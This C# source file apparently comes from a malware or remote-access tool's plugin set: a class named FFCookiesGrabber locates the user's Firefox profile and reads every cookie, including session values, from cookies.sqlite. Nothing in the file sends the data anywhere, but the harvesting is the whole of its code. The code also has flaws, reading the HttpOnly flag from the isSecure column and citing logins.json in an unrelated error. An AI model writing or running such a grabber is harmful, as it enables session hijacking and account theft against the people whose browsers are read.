using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Plugin.Browsers.Firefox.Cookies
{
    public class FFCookiesGrabber
    {
        private static DirectoryInfo firefoxProfilePath;
        private static FileInfo firefoxCookieFile;

        private static void Init_Path()
        {

            firefoxProfilePath = GetProfilePath();
            if (firefoxProfilePath == null)
                throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");

            firefoxCookieFile = GetFile(firefoxProfilePath, "cookies.sqlite");
            if (firefoxCookieFile == null)
                throw new NullReferenceException("Firefox does not have any cookie file");

        }


        public static List<FirefoxCookie> Cookies()
        {
            Init_Path();
            List<FirefoxCookie> data = new List<FirefoxCookie>();
            SQLiteHandler sql = new SQLiteHandler(firefoxCookieFile.FullName);
            if (!sql.ReadTable("moz_cookies"))
                throw new Exception("Could not read cookie table");

            int totalEntries = sql.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    string h = sql.GetValue(i, "host");
                    //Uri host = new Uri(h);
                    string name = sql.GetValue(i, "name");
                    string val = sql.GetValue(i, "value");
                    string path = sql.GetValue(i, "path");

                    bool secure = sql.GetValue(i, "isSecure") == "0" ? false : true;
                    bool http = sql.GetValue(i, "isSecure") == "0" ? false : true;

                    // if this fails we're in deep shit
                    long expiryTime = long.Parse(sql.GetValue(i, "expiry"));
                    long currentTime = ToUnixTime(DateTime.Now);
                    DateTime exp = FromUnixTime(expiryTime);
                    bool expired = currentTime > expiryTime;

                    data.Add(new FirefoxCookie()
                    {
                        Host = h,
                        ExpiresUTC = exp,
                        Expired = expired,
                        Name = name,
                        Value = val,
                        Path = path,
                        Secure = secure,
                        HttpOnly = http
                    });
                }
                catch (Exception)
                {
                    return data;
                }
            }
            return data;
        }

        private static DateTime FromUnixTime(long unixTime)
        {
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTime);
        }
        private static long ToUnixTime(DateTime value)
        {
            TimeSpan span = (value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime());
            return (long)span.TotalSeconds;
        }

        private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
        {
            foreach (FileInfo file in profilePath.GetFiles(searchTerm))
            {
                return file;
            }
            throw new Exception("No Firefox logins.json was found");


        }
        private static DirectoryInfo GetProfilePath()
        {
            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
            if (!Directory.Exists(raw))
                throw new Exception("Firefox Application Data folder does not exist!");
            DirectoryInfo profileDir = new DirectoryInfo(raw);

            DirectoryInfo[] profiles = profileDir.GetDirectories();
            if (profiles.Length == 0)
                throw new IndexOutOfRangeException("No Firefox profiles could be found");

            // return first profile, fuck it.
            return profiles[0];

        }
        public class FirefoxCookie
        {
            public string Host { get; set; }
            public string Name { get; set; }
            public string Value { get; set; }
            public string Path { get; set; }
            public DateTime ExpiresUTC { get; set; }
            public bool Secure { get; set; }
            public bool HttpOnly { get; set; }
            public bool Expired { get; set; }

            public override string ToString()
            {
                return string.Format("Host: {1}{0}Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, Host, Name, Value, Path, Expired, HttpOnly, Secure);
            }
        }
    }
}
